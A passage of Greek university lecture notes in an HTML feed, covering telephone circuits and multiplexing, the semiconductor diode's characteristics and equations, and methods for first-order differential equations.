<li>Simplex λειτουργία: Μόνο ένας μπορεί να μιλήσει και ο άλλος μπορεί μόνο να ακούσει
<ul class="org-ul">
<li><i>Πρόγονος</i> της half, full duplex:
<ul class="org-ul">
<li><b>half duplex</b>: Μόνο ένας μπορεί να εκπέμπει επί του μέσου κάθε χρονική
στιγμή. (Με όρους υπολογιστών, μόνο upload ή μόνο download, ποτέ ταυτόχρονα)</li>
<li><b>full duplex</b>: Και οι δύο <i>συμμετέχοντες</i> μπορούν τόσο να εκπέμπουν όσο και να
λαμβάνουν κάθε χρονική στιγμή</li>
</ul></li>
</ul></li>
<li>Σε αυτό το απλουστευμένο <i>κυκλωμα</i> φαίνεται ακόμα και γιατί πλέον (VoIP) τα
τηλέφωνα δεν λειτουργούν κατα την διάρκεια διακοπής ρεύματος. Ενώ στο
εικονιζόμενο σύστημα τα τηλέφωνα τροφοδοτούνται απο ανεξάρτητο σύστημα
μπαταριών που βρίσκεται στα κεντρικά του παρόχου, πλέον τα τηλέφωνα
τροφοδοτούνται τοπικά, με αποτέλεσμα η διακοπή ρεύματος να επηρεάζει την
λειτουργία τους.</li>
</ul>

<div class="note" id="orgab2db4a">
<p>
Δεν είχα κρατήσει κατάλληλες σημειώσεις ως προς το ίδιο το βελτιωμένο κύκλωμα
την ώρα της διάλεξης και δεν μπόρεσα να βρω πουθενά το <i>σχεδιάγραμμα</i>. Αν το έχει
κανείς ας το περιγράψει στα σχόλια, ή να το ανεβάσει σαν PR&#x2026;
</p>

</div>

<p>
Αναλύοντας λίγο παραπάνω το κύκλωμα της προηγούμενης εικόνας, και με την χρήση
μετασχηματιστών, μπορούμε να φτιάξουμε το <i>αντίστοιχο</i> full duplex τηλεφωνικό
κύκλωμα.
</p>

<p>
Το πρόβλημα σε αυτήν την υλοποίηση είναι οτι έχει echo, καθώς όπως φαίνεται σε
αυτό το <i>μέρος</i> του κυκλώματος το μικρόφωνο βρίσκεται άμεσα συνδεδεμένο με το μεγάφωνο.
</p>


<div id="org7562c64" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2249_echo-and-echo-cancelling.png" alt="230327_2249_echo-and-echo-cancelling.png">
</p>
<p><span class="figure-number">Figure 4: </span>Μέρος του full duplex κυκλώματος που ουσιαστικά αποτελεί την τοπική τηλεφωνική συσκευή, και (δεξιά) αναλογική λύση για echo canceling με ενισχυτή και αφαιρέτη.</p>
</div>

<p>
Το echo canceling παλαιότερα γινόταν με hardware, αλλά πλέον εξ ολοκλήρου
ψηφιακά. Ήταν (και είναι) απαραίτητο και για γραμμές δεδομένων επί του
τηλεφωνικού δικτύου.
</p>

<p>
Η εξεταζόμενη κατα την διάλεξη διάταξη ήταν της μορφής ADSL (Asymmetric Digital
Subscriber Line)
</p>
</div>
</div>
<div id="outline-container-org0ff1cb8" class="outline-2">
<h2 id="org0ff1cb8"><span class="section-number-2">4.</span> <a href="#org0ff1cb8">Λειτουργία χειριστηρίων TP</a></h2>
<div class="outline-text-2" id="text-4">
<div class="note" id="orgecb7246">
<p>
Για μεταβατική περίοδο, τηλέφωνα που εξυπηρετούν και τις δύο ουσιαστικά
τεχνολογίες (διακοπτάκι TP απο κάτω (TONE, PUNCH))
</p>

</div>



<div id="orga217bfa" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2256_tone-punch-models.png" alt="230327_2256_tone-punch-models.png">
</p>
<p><span class="figure-number">Figure 5: </span>Αριστουργηματική αναπαράσταση tone(αριστερά) και punch(δεξιά) τύπου τηλεφωνικής συσκευής.</p>
</div>
</div>
<div id="outline-container-org9391061" class="outline-3">
<h3 id="org9391061"><span class="section-number-3">4.1.</span> <a href="#org9391061">Περιστροφικός</a></h3>
<div class="outline-text-3" id="text-4-1">
<ul class="org-ul">
<li>Λειτουργία του <i>περιστροφικού επιλογέα αριθμών (καντραν)</i></li>
<li>Επιτυγχανόταν λόγω της σταθερής κυκλικής συχνότητας κατά την επιστροφή,
παράγοντας παλμούς DC και επιτελώντας την λειτουργία signaling
<ul class="org-ul">
<li>αριθμός +2 παλμούς ανα αριθμό</li>
<li>αν χανόταν παλμός, λόγω του τύπου λειτουργίας θα καλούσαμε λάθος νούμερο.</li>
</ul></li>
</ul>
</div>
</div>
<div id="outline-container-org6da8fa9" class="outline-3">
<h3 id="org6da8fa9"><span class="section-number-3">4.2.</span> <a href="#org6da8fa9">Πίνακας αριθμών</a></h3>
<div class="outline-text-3" id="text-4-2">
<ul class="org-ul">
<li>Εξέλιξη: number matrix αντί για περιστροφικού δίσκου (αυτό λέγεται και πινακας
αριθμών).</li>
<li>Είναι αδιάφορο το κυκλωματικό μέρος - προκαλούν την λειτουργία τοπικών
ταλαντωτών&#x2026; περιορισμός στα 4kHz.</li>
<li>Συχνότητες εντός του τηλεφωνικού φάσματος μεταφέρονται με το πάτημα κουμπιού,
και αναγνωρίζονται στο σημείο εισόδου του παρόχου (filter bank),
αναγνωρίζοντας τον αριθμό.
<ul class="org-ul">
<li>Σύνολο BPF Filters. Με αυτό το σύστημα αναγνωρίζεται η έξοδος απο δύο
φίλτρα, δείχνοντας το κατάλληλο νούμερο. Η τεχνολογία ονομάζεται DTMF (Dual
Tone Multiple Frequency)</li>
<li>Ενδιαφέρουσα εφαρμογή αυτού συναντάται στα αυτοματοποιημένα τηλεφωνικά
κέντρα &ldquo;πατήστε 1&rdquo; &#x2026;</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org358de04" class="outline-2">
<h2 id="org358de04"><span class="section-number-2">5.</span> <a href="#org358de04">Εκπομπή σε μεγάλες αποστάσεις</a></h2>
<div class="outline-text-2" id="text-5">
</div>
<div id="outline-container-orgc0ca8a9" class="outline-3">
<h3 id="orgc0ca8a9"><span class="section-number-3">5.1.</span> <a href="#orgc0ca8a9">Κολώνες (σαν ΔΕΗ), με διπλό σύρμα</a></h3>
<div class="outline-text-3" id="text-5-1">
<p>
Παλαιά διαρρύθμιση του ΟΤΕ κατ&rsquo; αυτόν τον τρόπο. Ουσιαστικά είχαμε πολύ <i>χαμηλή</i>
εκμετάλλευση των υποδομών.
</p>


<div id="orgf3e5862" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2303_metafora-me-kalodia-enaeria.png" alt="230327_2303_metafora-me-kalodia-enaeria.png">
</p>
<p><span class="figure-number">Figure 6: </span>Ναι σαν κολώνες ΔΕΗ, φαίνεται ξεκάθαρα</p>
</div>
</div>
</div>
<div id="outline-container-org9b0e353" class="outline-3">
<h3 id="org9b0e353"><span class="section-number-3">5.2.</span> <a href="#org9b0e353">FDM</a></h3>
<div class="outline-text-3" id="text-5-2">
<div class="note" id="orga0350d6">
<p>
Προβληματική για το διαδίκτυο σύμβαση που ίσχυσε στα δίκτυα φωνής, ο
περιορισμός του καναλιού με LPF στα 4KHz
</p>

</div>


<div id="org6ad368c" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2306_fdm-kai-rf-athroistes.png" alt="230327_2306_fdm-kai-rf-athroistes.png">
</p>
<p><span class="figure-number">Figure 7: </span>Άχρηστο γράφημα να δείξει ότι με την κατάλληλη διαμόρφωση και άθροιση των <b>πολλών</b> καναλιών εισόδου, μπορούν ουσιαστικά να ομαδοποιηθούν και να σταλούν ταυτόχρονα μεγάλα πλήθη τηλεφωνικών καναλιών.</p>
</div>

<p>
Αντικατάσταση με FDM συστήματα:
</p>
<ul class="org-ul">
<li>LPF @4KHz</li>
<li>Πολλαπλασιασμός με διάφορα φέροντα</li>
<li>άθροισμα των επιμέρους <i>διαμορφωμένων-μετατοπισμένων</i> σημάτων, και περαιτέρω
μετατόπιση με φίλτρο RF, ούτως ώστε αυτή εν συνεχεία να μπορεί να υπάρξει
εκπομπή</li>
<li>Εκπομπή από κεραία μεγάλης ορατότητας.</li>
</ul>


<p>
Αυτή η τεχνολογία μετάδοσης, αν και δεν κράτησε πολύ και γρήγορα αντικαταστάθηκε από το
ομοαξονικό καλώδιο είχε πολύ άμεσα αποτελέσματα, επιτρέποντας σε συνδρομήτες
(για παράδειγμα) να φτάσουν από την Θεσσαλονίκη Αθήνα μόνο με μερικά hops μεταξύ
κεραιών
</p>


<div id="orgdc32e87" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/Coaxial_cable_cutaway.svg.png" alt="Coaxial_cable_cutaway.svg.png">
</p>
<p><span class="figure-number">Figure 8: </span>Ομοαξονικό χάλκινο καλώδιο. Πηγή:<a href="https://en.m.wikipedia.org/wiki/">https://en.m.wikipedia.org/wiki/</a></p>
</div>

<p>
Αντί να συνδέεται πλέον σε πιάτο (κεραία) για να σταλεί ασύρματα
</p>
<ul class="org-ul">
<li>coaxial cable</li>
<li>2 σύρματη γραμμη,</li>
<li>Άνετα περνάει 1GHz σε 100 χιλιόμετρα.</li>
</ul>
</div>
</div>
<div id="outline-container-org97d6131" class="outline-3">
<h3 id="org97d6131"><span class="section-number-3">5.3.</span> <a href="#org97d6131">TDM και οπτικές ίνες</a></h3>
<div class="outline-text-3" id="text-5-3">
<p>
Μετάβαση από FDM σε TDM:
</p>
<ul class="org-ul">
<li>Προστέθηκε: DFDM, DTDM, ενώ τονίστηκε πως εμείς θα μπλέξουμε με SFDM STDM
<ul class="org-ul">
<li>Deterministic</li>
<li>Statistical</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orgbdae490" class="outline-2">
<h2 id="orgbdae490"><span class="section-number-2">6.</span> <a href="#orgbdae490">Analog to Digital in voice:</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Από αναλογικά κανάλια των 4KHz, να περάσουμε σε ψηφιοποίηση της πληροφορίας
για μετάδοση μέσω ηλεκτρονικών/ψηφιακών συστημάτων:
</p>

<p>
Ο Nyquist λέει ότι με τέτοια συχνότητα αναλογικού σήματος η συχνότητα
δειγματοληψίας θα πρέπει να είναι 2x4ksamples/sec, έτσι με κβάντιση της τάξης
των 8bits/sample, έχουμε ένα κατώτατο όριο μετάδοσης της τάξης των 64Kbps
</p>
<ul class="org-ul">
<li>PCM voice channel</li>

<li>Κανάλια επί ομοαξονικού καλωδίου, ανάγκη TDM σε αυτή την περίπτωση, έγινε απλή
σχηματική αναπαράσταση.</li>
<li>Διαμόρφωση του σήματος σε υποδιαιρέσεις του παλμού PCM</li>
</ul>
</div>
</div>
<div id="outline-container-org1dfa1c5" class="outline-2">
<h2 id="org1dfa1c5"><span class="section-number-2">7.</span> <a href="#org1dfa1c5">Κλείνοντας</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Και φτάσαμε μέχρι την οπτική ίνα, με μία απλή επεξήγηση της <i>φύσης</i> της.
</p>
<ul class="org-ul">
<li>Grading - κυματοδήγηση κτλ κτλ</li>
</ul>
</div>
</div>
]]>
</description></item>
<item>
<title>Η δίοδος</title>
<link>posts/lectures/auth/el1/lec_EL1_1_20220407.html</link>
<pubDate>Thu, 07 Apr 2022 00:00:00 +0300</pubDate>
<guid>posts/lectures/auth/el1/lec_EL1_1_20220407.html</guid>
<description>
<![CDATA[<div id="outline-container-org8cd9c2a" class="outline-2">
<h2 id="org8cd9c2a"><span class="section-number-2">1.</span> <a href="#org8cd9c2a">Εφαρμογές της διόδου</a></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li>Διακόπτες ( ανορθωτές ρεύματος - rectifier)</li>
<li>Σταθεροποιητές ( δίοδος Zener )</li>
</ul>
</div>
</div>
<div id="outline-container-org7434f8e" class="outline-2">
<h2 id="org7434f8e"><span class="section-number-2">2.</span> <a href="#org7434f8e">Χαρακτηριστική ρεύματος-τάσης</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Η δίοδος είναι πολωμένο στοιχείο, γεγονός που σημαίνει ότι έχει <i>ιδιαίτερη</i>
σημασία η θετική ( ή αντίστοιχα η αρνητική ) πόλωση. Πιο συγκεκριμένα:
</p>


<div id="orgbecf573" class="figure">
<p><img src="posts/lectures/auth/el1/../../../../images/EL1/el1_lec_1_diode.png" alt="el1_lec_1_diode.png">
</p>
</div>
<p>
Η δίοδος άγει μόνο με θετική τάση στα άκρα της, ενώ λειτουργεί <i>πρακτικά</i> σαν
ανοιχτοκύκλωμα με αρνητική τάση. Εφόσον φτάσει την τάση στην οποία άγει, δεν θα
εμφανιστεί μεγαλύτερη τάση στα άκρα της. Αν εφαρμοστεί εξαιρετικά μεγάλη
αρνητική τάση στα άκρα της μπορεί να φτάσει στο καταστροφικό σημείο.
</p>
</div>
<div id="outline-container-org4790c9d" class="outline-3">
<h3 id="org4790c9d"><span class="section-number-3">2.1.</span> <a href="#org4790c9d">Θετική τάση</a></h3>
<div class="outline-text-3" id="text-2-1">
<ul class="org-ul">
<li>Αρχίζει να άγει από περίπου 0.5V</li>
<li>Σε αυτή την περίπτωση μιλάμε για: <b>Θετική/Forward Πόλωση της διόδου</b></li>
<li>Δεν εφαρμόζεται νόμος του Ωμ, άρα δεν αποτελεί ( προφανώς, άλλωστε ) Ωμικό
στοιχείο: Δεν τίθεται περιορισμός του ρεύματος ( παρα μόνο από την ισχύ της
διόδου ( προφανώς ))</li>
</ul>
</div>
</div>
<div id="outline-container-org5ccb0b6" class="outline-3">
<h3 id="org5ccb0b6"><span class="section-number-3">2.2.</span> <a href="#org5ccb0b6">Αρνητική τάση</a></h3>
<div class="outline-text-3" id="text-2-2">
<ul class="org-ul">
<li>Γενικά, μπορεί να θεωρηθεί πως με αρνητική τάση η δίοδος διαρρέεται από το
αμελητέο <b>Ρεύμα διαρροής</b>:
<ul class="org-ul">
<li>Λαμβάνεται υπόψη ανάλογα με την ακρίβεια των μετρήσεων που θέλουμε</li>
<li>Είναι της τάξης των \(nA\)
<ul class="org-ul">
<li>Από τα παραπάνω καταλαβαίνουμε πως σε <b>πολλά</b> προβλήματα δεν μας ενδιαφέρει.</li>
</ul></li>
</ul></li>
<li>Αν δεν θέλω να πηγαίνει καθόλου ρεύμα?
<ul class="org-ul">
<li><p>
Σε πολλές περιπτώσεις το ρεύμα της τάξης των \(nA\) θεωρείται μηδενικό ρεύμα,
εξού και η αναφορά σε ανορθωτές ρεύματος. Εφόσον το πλάτος είσόδου είναι
περιορισμένο ( και η δίοδος δεν φτάνει στο <b>καταστροφικό σημείο</b> ), η όποια
αρνητική τάση θα <i>αφήνει</i> πολύ λίγο ρεύμα να διαρρεέι, πρακτικά
δημιουργώντας συνεχές ( και όχι σταθερό ) ρεύμα.
</p>


<div id="org591ce10" class="figure">
<p><img src="posts/lectures/auth/el1/../../../../images/EL1/el1_lec_1_anorthosi.png" alt="el1_lec_1_anorthosi.png">
</p>
</div></li>
</ul></li>

<li><b>Breakdown point/ Καταστροφικό σημείο</b>: Το σημείο της <i>αρνητικής</i> τάσης, πέραν
της οποίας η δίοδος παύει να περιορίζει το ρεύμα αλλά λειτουργεί <i>σαν
βραχυκύκλωμα</i>.
<ul class="org-ul">
<li>Εξαίρεση η δίοδος Zener, η οποία κατασκευάζεται για λειτουργία και σε
εκείνες τις περιοχές.</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-org6e5130c" class="outline-2">
<h2 id="org6e5130c"><span class="section-number-2">3.</span> <a href="#org6e5130c">Ιδανικά Μοντέλα:</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Προηγουμένως αναφέρθηκε ότι η δίοδος αρχίζει να άγει από \(V_D\approx 0.5V\). Όπου
το \(D\) προέρχεται από το αγγλικό Drain. Σε πολλά μοντέλα θεωρείται λογικό \(V_D =
0\), με αποτέλεσμα η παραμικρή θετική τάση να συνεπάγεται διαρροή της διόδου από
ρεύμα. Αυτό όμως δεν είναι συμβατό με την πραγματικότητα όπου ανάλογα με το
υλικό κατασκευής της διόδου ( πυρίτιο ή γερμάνιο ) \(V_D = 0.6V\) ή \(V_D = 0.7V\)
</p>
</div>
<div id="outline-container-org944938a" class="outline-3">
<h3 id="org944938a"><span class="section-number-3">3.1.</span> <a href="#org944938a">Πότε χρησιμοποιούμε το \(V_D\), αντί να μένουμε στο 0</a></h3>
<div class="outline-text-3" id="text-3-1">
<p>
Όταν τα \(0.6V\) έχουν κάποια λογική να μπουν στις εξισώσεις. Αν δηλαδή εξετάζουμε
τάσεις της τάξης των \(6V\) αξίζει, ενώ στα \(220V\) είναι προφανές πως κάτι τέτοιο
δεν είναι λογικό.
</p>
</div>
</div>
</div>
<div id="outline-container-org29314ae" class="outline-2">
<h2 id="org29314ae"><span class="section-number-2">4.</span> <a href="#org29314ae">Εξίσωση ρεύματος εισόδου - εξόδου</a></h2>
<div class="outline-text-2" id="text-4">
\begin{equation}
I_D = I_S ( e^{\frac{V_D}{nV_T}}-1 )
\end{equation}
<p>
Έχουμε πως:
</p>
<ol class="org-ol">
<li>\(I_S\) ανάστροφο ρεύμα κόρου, εξαρτάται από την θερμοκρασία. Διπλασιάζεται
κάθε 10 βαθμούς κελσίου</li>
<li>\(V_T = \frac{kT}{q} = 26mV (T=300K)\), ονομάζεται θερμική τάση</li>
<li>\(n= \begin{cases} 1 & \text{germanium}\\ 2& \text{silicon} \end{cases}\)
Είναι σταθερά για το υλικό, ιδιότητα του , και θα δίνεται.</li>
</ol>
</div>
<div id="outline-container-orgfac66ca" class="outline-3">
<h3 id="orgfac66ca"><span class="section-number-3">4.1.</span> <a href="#orgfac66ca">Επίδραση Θερμοκρασίας στην χαρακτηριστική:</a></h3>
<div class="outline-text-3" id="text-4-1">
<p>
Όσο αυξάνεται η θερμοκρασία για την ίδια τιμή τάσης θα έχουμε μεγαλύτερο ρεύμα.
Και δημιουργεί προβλήματα ( εύλογο, καθώς το κύκλωμα δεν θα μείνει στις ίδιες
συνθήκες θερμοκρασίας καθ&rsquo;όλη την λειτουργία του )
</p>
<blockquote>
<p>
Ο μεγαλύτερος πονοκέφαλος στην σχεδίαση κυκλωμάτων
</p>
</blockquote>
</div>
</div>
</div>
<div id="outline-container-org9412724" class="outline-2">
<h2 id="org9412724"><span class="section-number-2">5.</span> <a href="#org9412724">Ισοδύναμα Κυκλώματα:</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Τα ισοδύναμα κυκλώματα δεν είναι ίδια για καθε τύπο ρεύματος που τα διαρρέι:
</p>
<ul class="org-ul">
<li>Συνεχούς</li>
<li>Εναλασσόμενου
<ul class="org-ul">
<li>Χαμηλών συχνοτήτων</li>
<li>Μέσων συχνοτήτων</li>
<li>Υψηλών συχνοτήτων</li>
</ul></li>
</ul>

<p>
Υπάρχει, βέβαια και το γενικό ισοδύναμο. Αυτό το μάθημα επικεντρώνεται κυρίως
στην λειτουργία στις μέσες συχνότητες.
</p>
</div>
</div>
<div id="outline-container-orge4187d5" class="outline-2">
<h2 id="orge4187d5"><span class="section-number-2">6.</span> <a href="#orge4187d5">Αναλυτική Λύση</a></h2>
<div class="outline-text-2" id="text-6">
<p>
Κανείς δεν κάνει αναλυτική λύση με το χέρι. Είναι σημαντικό να γίνει αυτή η
διαφοροποίηση: μαθαίνουμε να <i>κατανοούμε</i> το κύκλωμα, οι παράμετροι θα
υπολογίζονται με κάποιο πακέτο λογισμικού
</p>
</div>
</div>
<div id="outline-container-org3205e5a" class="outline-2">
<h2 id="org3205e5a"><span class="section-number-2">7.</span> <a href="#org3205e5a">Πόλωση διόδου:</a></h2>
<div class="outline-text-2" id="text-7">
<p>
Ονομάζουμε το συνεχές ρεύμα που θα χρησιμοποιήσουμε για να θέσουμε την δίοδο μας
σε συγκεκριμένες συνθήκες λειτουργίας. Πιο συγκεκριμένα, αναφερόμενοι στην
χαρακτηριστική εξίσωση που προηγείται, είναι προφανές πως ανάλογα με το πλάτος
της εισόδου και την συνεχή συνιστώσα της θα υπάρχει ( ή όχι ) η αντίστοιχη
παραμόρφωση.
</p>

<p>
Προκειμένου, λοιπόν, να δουλέψουμε σε ένα κατα το δυνατόν γραμμικό μέρος της
χαρακτηριστικής εισόδου εξόδου της διόδου, είναι συχνό να εφαρμόζουμε συνεχή
τάση ( συνάρτηση της εισόδου που θα παρέχουμε στο κύκλωμα ) έτσι ώστε να
περιορίσουμε την παραμορφωση, λειτουργώντας στην <i>γραμμική</i> περιοχή της διόδου.
</p>

<p>
<i>(Αυτού του είδους η μελέτη και σχεδιασμός είναι ιδαίτερα χρήσιμος όταν έχουμε
να κάνουμε μελέτη μικρού σήματος)</i>
</p>

<p>
Το <b>Σημείο ηρεμίας ή λειτουργίας</b> ονομάζεται σημείο \(Q\)
</p>
</div>
</div>
<div id="outline-container-org4af5aa7" class="outline-2">
<h2 id="org4af5aa7"><span class="section-number-2">8.</span> <a href="#org4af5aa7">Δυναμική αντίσταση διόδου</a></h2>
<div class="outline-text-2" id="text-8">
<p>
Αναφερόμενοι στην χαρακτηριστική εξίσωση της διόδου, με παραγώγιση προκύπτει:
</p>
\begin{equation}
g_d = \frac{d{I_D}}{d{V}} = \frac{1}{V_T}I_Se^{\frac{V_D}{nV_T}}\approx \frac{I_D}{nV_T}
\end{equation}
<p>
Και καθώς η αγωγιμοτητα το αντίστροφο της αντίστασης έχουμε τελικά:
</p>
\begin{equation}
r_d = \frac{1}{g_d} = \frac{nV_T}{I_D}
\end{equation}
</div>
</div>
<div id="outline-container-orge824701" class="outline-2">
<h2 id="orge824701"><span class="section-number-2">9.</span> <a href="#orge824701">Ισχύς διόδου - Μέγιστο ρεύμα;</a></h2>
<div class="outline-text-2" id="text-9">
<p>
Όταν η δίοδος άγει εφαρμόζεται στα άκρα της ταση \(0.7 V\)<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, η οποία δεν
μεταβάλλεται ( δεν μπορεί να λάβει μεγαλύτερες τιμές ), οπότε προφανώς:
</p>
\begin{align*}
P&=IV \Rightarrow \\
\Rightarrow $max(I) = \frac{P}{0.7}$
\end{align*}

<p>
Με την ισχύ να είναι χαρακτηριστική της διόδου που χρησιμοποιούμε και δίνεται
από τον κατασκευαστή.
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Η τιμή μπορεί να διαφέρει ανά υλικό κατασκευής της διόδου, έχει μείνει
έτσι για το παράδειγμα.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διαφορικές εξισώσεις πρώτης τάξης</title>
<link>posts/lectures/auth/em1/first_order_de.html</link>
<pubDate>Sat, 26 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/em1/first_order_de.html</guid>
<description>
<![CDATA[<p>
Οι Διαφορικές εξισώσεις (από εδώ και στο εξής αναφερόμενες ως ΔΕ) χωρίζονται σε
κατηγορίες ανάλογα με τη μορφή και τις ιδιότητες τους. Συγκεκριμένα σημαντικό
ρόλο παίζουν η <b>τάξη</b> ( η μεγαλύτερη παράγωγος της ζητούμενης συνάρτησης που
εμφανίζεται και ο <b>βαθμός</b> ( δηλαδή η μεγαλύτερη δύναμη της μεγαλύτερης
παραγώγου).
</p>
<div id="outline-container-org1176052" class="outline-2">
<h2 id="org1176052"><span class="section-number-2">1.</span> <a href="#org1176052">Γραμμικές</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Ονομάζονται όλες οι εξισώσεις της μορφής:
</p>
\begin{equation}
\frac{d{y}}{d{x}} + p(x)y=q(x)
\end{equation}
<p>
και η γενική τους λύση είναι η:
</p>
\begin{equation}
y = e^{-\int p(x)dx}\int e^{\int p(x)dx}q(x)dx
\end{equation}
<p>
η οποία προκύπτει κατά τον πολλαπλασιασμό και των δύο μερών της αρχικής εξίσωσης
με τον όρο \(e^{\int p(x)dx}\)
</p>
</div>
<div id="outline-container-org59f2bae" class="outline-3">
<h3 id="org59f2bae"><span class="section-number-3">1.1.</span> <a href="#org59f2bae">Σημαντική υποσημείωση</a></h3>
<div class="outline-text-3" id="text-1-1">
<p>
Στην επίλυση της εξίσωσης είναι σημαντικό να μην ξεχαστεί η σταθερά ολοκλήρωσης:
</p>
\begin{equation}
y = \cdots [ \int\cdots dx + c ]
\end{equation}
</div>
</div>
</div>
<div id="outline-container-orgf1cd8a2" class="outline-2">
<h2 id="orgf1cd8a2"><span class="section-number-2">2.</span> <a href="#orgf1cd8a2">Ricatti</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Ονομάζουμε Δ.Ε. Ricatti κάθε ΔΕ πρώτης τάξης της μορφής:
</p>
\begin{equation}
\frac{d{y}}{d{x}}+f(x)y^2+g(x)y+h(x)=0
\end{equation}
</div>
<div id="outline-container-org11bd3d8" class="outline-3">
<h3 id="org11bd3d8"><span class="section-number-3">2.1.</span> <a href="#org11bd3d8">Επίλυση</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Για την επίλυση μιας τέτοιας διαφορικής εξίσωσης χρειάζεται κανεις να ξέρει την
πρώτη εκ των δύο ριζών \(y_1(x)\). Γνωρίζοντας την θέτεις \(y = y_1 + \frac{1}{u}\)
όπου \(u\) καταλλήλως ορισμένη συνάρτηση.
</p>
</div>
</div>
</div>
<div id="outline-container-orgab63a3b" class="outline-2">
<h2 id="orgab63a3b"><span class="section-number-2">3.</span> <a href="#orgab63a3b">Bernoulli</a></h2>
<div class="outline-text-2" id="text-3">
<p>
Της μορφής:
</p>
\begin{equation}
\frac{d{y}}{d{x}} + g(x)y = f(x)y^n
\end{equation}
</div>
<div id="outline-container-org0a7eeba" class="outline-3">
<h3 id="org0a7eeba"><span class="section-number-3">3.1.</span> <a href="#org0a7eeba">Επίλυση</a></h3>
<div class="outline-text-3" id="text-3-1">
<ol class="org-ol">
<li>Διαίρεση με \(y^n\)
Είναι προφανές πως θέλουμε να την φέρουμε σε μια μορφή πιο κοντά σε εκείνες
που γνωρίζουμε, για αυτό και διαιρούμε με \(y^n\) έτσι ώστε στο δεύτερο μέρος
να μείνει μόνο η \(f(x)\).</li>
<li>Θέσιμο \(u = y^{1-n}\) και αναγωγή σε γραμμική ΔΕ
Με αυτό τον τρόπο οι <i>παράξενοι όροι</i> που περιλαμβάνουν αρνητικές δυνάμεις
του \(y\) <i>εξαφανίζονται</i> και απομένει μόνο μια γραμμική ΔΕ πρώτης τάξης με
άγνωστη συνάρτηση την \(u(x)\)</li>
<li>Επίλυση της γραμμικής και αντικατάσταση
Λύνοντας την γραμμική με τον γνωστό τρόπο βρίσκουμε τον τύπο της \(u(x)\) και
αντικαθιστώντας \(u = y^{1-n}\) έχουμε την πλεγμένη μορφή της λύσης(?)</li>
</ol>
</div>
</div>
</div>
<div id="outline-container-org1862fd8" class="outline-2">
<h2 id="org1862fd8"><span class="section-number-2">4.</span> <a href="#org1862fd8">Ομογενείς ΔΕ</a></h2>
<div class="outline-text-2" id="text-4">
<p>
Αυτή η κατηγορία ΔΕ μπορεί να περιγραφεί από την
</p>

\begin{equation}
\frac{d{y}}{d{x}} = F(\frac{y}{x})
\end{equation}

<p>
<i>Κάτι πάει λάθος με τους διαφορετικούς ορισμούς σε πηγές</i>
</p>
</div>
<div id="outline-container-orgb53b3a3" class="outline-3">
<h3 id="orgb53b3a3"><span class="section-number-3">4.1.</span> <a href="#orgb53b3a3">Επίλυση</a></h3>
<div class="outline-text-3" id="text-4-1">
<ol class="org-ol">
<li>Θέτουμε \(y = ux\) όπου \(u\) μια καταλλήλως ορισμένη συνάρτηση</li>
<li>Αντικαθιστούμε στην εξίσωση, μετατρέποντας την στην πιο απλή κατηγορία ΔΕ</li>
<li>Αντικαθιστούμε \(u = \frac{y}{x}\)</li>
</ol>
</div>
</div>
<div id="outline-container-orgd18cb6d" class="outline-3">
<h3 id="orgd18cb6d"><span class="section-number-3">4.2.</span> <a href="#orgd18cb6d">Υποπεριπτώσεις</a></h3>
<div class="outline-text-3" id="text-4-2">
</div>
<div id="outline-container-org6d7b14a" class="outline-4">
<h4 id="org6d7b14a"><span class="section-number-4">4.2.1.</span> <a href="#org6d7b14a">Επίλυση συστήματος</a></h4>
<div class="outline-text-4" id="text-4-2-1">
<p>
Αν δεν έχουμε την <i>αρχική</i> μορφή ομογενούς ΔΕ αλλά:
</p>
\begin{equation}
\frac{d{y}}{d{x}}=f(\frac{a_1x+b_1y+c_1}{a_2x+b_2y+c_2})
\end{equation}
<p>
<span class="underline">και</span> το σύστημα των δυο εξισώσεων:
</p>
\begin{align*}
\begin{cases}
a_1x+b_1y+c_1 &= 0\\
a_2x+b_2y+c_2 &= 0
\end{cases} \Rightarrow
\begin{cases}
x = x_0\\
y = y_{0}
\end{cases}
\end{align*}
<p>
τότε η ΔΕ λύνεται με αντικατάσταση \(X=x-x_0\), \(Y=y-y_0\), στο οποίο στάδιο εκείνη
ανάγεται σε ΔΕ χωριζόμενων μεταβλητών.
</p>
</div>
</div>
</div>
</div>
<div id="outline-container-org27a8cde" class="outline-2">
<h2 id="org27a8cde"><span class="section-number-2">5.</span> <a href="#org27a8cde">ΔΕ χωριζόμενων μεταβλητών</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Ονομάζονται οι ΔΕ πρώτης τάξης της μορφής:
</p>
\begin{equation}
\frac{d{y}}{d{x}} = p(x)q(y)
\end{equation}

<p>
Διότι, προφανώς εύκολα μετασχηματίζονται σε
</p>
\begin{equation}
\frac{dy}{q(y)}=p(x)dx
\end{equation}
<p>
όπου, ουσιαστικά, οι μεταβλητές είναι απομονωμένες στα διαφορετικά μέρη της
εξίσωσης και η λύση έρχεται με απλή ολοκλήρωση.
</p>
</div>
</div>
<div id="outline-container-orgae7dcb0" class="outline-2">
<h2 id="orgae7dcb0"><span class="section-number-2">6.</span> <a href="#orgae7dcb0">Πλήρεις ΔΕ</a></h2>
<div class="outline-text-2" id="text-6">
<p>
